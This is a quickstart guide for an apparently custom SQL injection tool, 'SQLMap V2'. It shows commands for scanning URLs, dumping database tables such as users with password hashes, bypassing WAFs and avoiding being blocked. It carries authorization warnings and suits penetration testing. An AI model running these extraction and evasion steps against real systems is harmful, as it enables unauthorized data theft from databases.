# QUICKSTART.md
# SQLMap V2 - Quick Start Guide

## 📦 Installation (2 minutes)

### Prerequisites
- Python 3.7 or higher
- pip (Python package manager)

### Setup
```bash
# 1. Install dependencies
pip install requests

# 2. Verify installation
python main.py --help

# 3. Create logs directory (auto-created but ensures permissions)
mkdir -p logs reports
```

✅ You're ready to go!

---

## 🚀 First Scan (5 minutes)

### The Simplest Scan
```bash
python main.py --url "http://target.com/search?q=test"
```

Watch the output:
- ✓ Shows what parameters are being tested
- ✓ Lists vulnerabilities found (if any)
- ✓ Displays confidence scores
- ✓ Shows injection point and payload

### What Happens Behind the Scenes
1. Extracts parameters (GET, POST, cookies)
2. Tests each parameter for SQL injection
3. Uses 4 different detection techniques
4. Reports findings with confidence %
5. Logs everything to `logs/sqlmap_v2.log`

---

## 🎯 Extract Data (10 minutes)

If your scan finds vulnerabilities, extract data:

```bash
python main.py \
    --url "http://target.com/search?q=test" \
    --extract \
    --db "appdb" \
    --table "users" \
    --dump-limit 50
```

This will:
1. ✓ Confirm vulnerability  
2. ✓ Detect DBMS (MySQL/PostgreSQL/MSSQL)
3. ✓ List databases
4. ✓ List tables in your target DB
5. ✓ Extract columns from target table
6. ✓ Dump 50 rows of data

---

## 📊 Generate Reports (2 minutes)

Export findings in professional formats:

```bash
python main.py \
    --url "http://target.com/search?q=test" \
    --extract \
    --export-json "findings.json" \
    --export-html "findings.html"
```

You'll get:
- 📄 `findings.json` - Machine-readable report
- 🌐 `findings.html` - Pretty formatted report for stakeholders

---

## ⚙️ Common Scenarios

### Scenario 1: Behind a Proxy (Burp Suite)
```bash
python main.py \
    --url "http://target.com/search?q=test" \
    --proxy "http://127.0.0.1:8080"
```

### Scenario 2: POST Request with Authentication
```bash
python main.py \
    --url "http://target.com/api/search" \
    --method POST \
    --data "query=test&limit=10" \
    --cookie "session=abc123" \
    --extract
```

### Scenario 3: JSON API
```bash
python main.py \
    --url "http://target.com/api/users" \
    --method POST \
    --json \
    --data '{"id":1,"search":"test"}' \
    --extract
```

### Scenario 4: Slow/Rate-Limited Target
```bash
python main.py \
    --url "http://target.com/search?q=test" \
    --threads 2 \
    --timeout 20 \
    --delay 10 \
    --extract
```

### Scenario 5: WAF Protected Target
```bash
python main.py \
    --url "http://target.com/search?q=test" \
    --waf-bypass \
    --threads 3 \
    --timeout 15 \
    --extract
```

---

## 🔍 Understanding Output

### Vulnerability Report
```
✓ VULNERABILITIES FOUND: 2

  [1] Parameter: q
      Type: boolean-based blind
      Confidence: 95.0%
      Injection Point: url

  [2] Parameter: sort
      Type: time-based blind
      Confidence: 85.0%
      Injection Point: url
```

**What this means:**
- Found 2 injectable parameters
- `q` parameter with 95% confidence = **HIGH RISK**
- `sort` parameter with 85% confidence = **MEDIUM RISK**

### Extraction Results
```
✓ Extracted 8 databases
✓ Extracted 5 tables from app_db
✓ Dumped 10 rows from app_db.users

  Columns: id, username, email, password_hash
  Row 1: {'id': '1', 'username': 'admin', ...}
  Row 2: {'id': '2', 'username': 'user123', ...}
```

---

## 📝 Command Reference

### Essential Options
| Option | Purpose | Example |
|--------|---------|---------|
| `--url` | Target URL | `--url "http://example.com/search?q=test"` |
| `--method` | HTTP method | `--method POST` |
| `--data` | POST payload | `--data "user=admin&pass=test"` |
| `--proxy` | Proxy URL | `--proxy "http://127.0.0.1:8080"` |
| `--extract` | Extract data | `--extract` |

### Scanning Options
| Option | Purpose | Default |
|--------|---------|---------|
| `--threads` | Parallel threads | 5 |
| `--timeout` | Request timeout | 10 seconds |
| `--technique` | Detection type | all |
| `--waf-bypass` | Enable WAF bypass | disabled |

### Extraction Options
| Option | Purpose | Example |
|--------|---------|---------|
| `--db` | Target database | `--db "webapp_db"` |
| `--table` | Target table | `--table "users"` |
| `--dump-limit` | Rows to extract | `--dump-limit 100` |
| `--injection-type` | Method (union/blind) | `--injection-type union` |

### Output Options
| Option | Purpose | Example |
|--------|---------|---------|
| `--export-json` | Save JSON report | `--export-json "report.json"` |
| `--export-html` | Save HTML report | `--export-html "report.html"` |
| `--verbose` | Debug output | `--verbose` |
| `--log-file` | Custom log file | `--log-file "scan.log"` |

---

## 🐛 Troubleshooting

### "No vulnerabilities found" but target is vulnerable
**Try:**
```bash
# Be more aggressive with time-based
python main.py --url "..." --technique time --delay 10

# Reduce timeout for quick response
python main.py --url "..." --timeout 5 --threads 2

# Enable WAF bypass
python main.py --url "..." --waf-bypass
```

### "Proxy connection failed"
**Check:**
```bash
# Verify proxy is running
netstat -an | grep 8080  # For Burp Suite default

# Test proxy manually
curl -x "http://127.0.0.1:8080" "http://example.com"

# Are you using HTTPS?
--proxy "https://127.0.0.1:8080"
```

### "Request timeout"
**Solution:**
```bash
# Increase timeout
python main.py --url "..." --timeout 30

# Reduce threads
python main.py --url "..." --threads 2

# Add delay between requests
# Edit request_handler.py
```

### "Too many false positives"
**Try:**
```bash
# Use specific technique instead of "all"
python main.py --url "..." --technique error

# Increase similarity threshold
# Edit analyzer/response_analyzer.py
# similarity_threshold = 0.8  (default 0.7)
```

### "Session expires during extraction"
**Solution:**
```bash
# Add authentication headers
python main.py --url "..." \
    --headers "Authorization:Bearer TOKEN" \
    --cookie "session=abc123" \
    --extract
```

---

## 📈 Performance Tips

### Speed Up Scanning
```bash
# Increase threads (be careful with WAF)
--threads 15

# Use faster UNION-based detection
--technique union

# Reduce timeout for slow servers
--timeout 5
```

### Speed Up Extraction
```bash
# Use UNION instead of blind
--injection-type union

# Reduce dump limit
--dump-limit 10

# Target specific columns
```

### Avoid Being Blocked
```bash
# Reduce threads to 1-2
--threads 2

# Increase delays
--timeout 30 --delay 5

# Enable WAF bypass
--waf-bypass

# Randomize requests
```

---

## 🔐 Security Reminders

⚠️ **IMPORTANT WARNINGS**

1. **Authorization Required**
   - Only test systems you own or have written permission to test
   - Keep authorization documentation
   - Respect legal boundaries

2. **Data Sensitivity**
   - Extracted data contains sensitive information
   - Secure reports with proper file permissions: `chmod 600 *.json`
   - Don't share reports to unauthorized parties
   - Delete reports when assessment is complete

3. **Logging**
   - Logs contain payloads and responses
   - Consider regulatory requirements (HIPAA, PCI-DSS, etc.)
   - Archive logs securely
   - Review logs for any sensitive data exposure

4. **Legal Compliance**
   - Verify legal compliance for your jurisdiction
   - Document testing scope and authorization
   - Follow responsible disclosure practices
   - Report vulnerabilities properly

---

## 📚 Learn More

### For Detailed Information
- **EXAMPLES.md** - 20+ real-world usage scenarios
- **CONFIGURATION.md** - Advanced settings and tuning
- **UPGRADE_NOTES.md** - Technical architecture details
- **IMPLEMENTATION_SUMMARY.md** - V1 vs V2 improvements

### For Specific Topics
- **Binary Search Extraction**: See exploiter/exploitation_engine.py
- **Response Analysis**: See analyzer/response_analyzer.py
- **Payload Generation**: See scanner/payloads.py
- **Detection Techniques**: See scanner/detection_engine.py

### SQL Injection Learning
- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- PortSwigger Web Security Academy: https://portswigger.net/web-security
- HackTheBox SQL Injection Challenges

---

## ✅ Quick Checklist

Before running against production targets:

- [ ] Test against authorized target with written permission
- [ ] Start with `--threads 2` (conservative)
- [ ] Review logs for errors: `logs/sqlmap_v2.log`
- [ ] Test extraction on non-critical data first
- [ ] Have backup/restore plan ready
- [ ] Secure all report files: `chmod 600`
- [ ] Document findings properly
- [ ] Follow responsible disclosure

---

## 🆘 Need Help?

### Check These First
1. Run with `--verbose` flag for detailed output
2. Review `logs/sqlmap_v2.log` for error details
3. Check EXAMPLES.md for similar scenarios
4. Review CONFIGURATION.md for advanced options

### Common Issues
- **Parameter not found**: URL might not be encoded, try `--verbose`
- **False positives**: Enable specific technique: `--technique error`
- **Extraction fails**: Try `--injection-type union` first
- **WAF blocks requests**: Enable `--waf-bypass`

---

**Next Steps:**
1. ✓ Run your first scan
2. ✓ Review the output carefully
3. ✓ Extract data if vulnerable
4. ✓ Generate reports
5. ✓ Review documentation for advanced usage

**Happy testing!** 🎯

(Remember: Only test what you're authorized to test!)
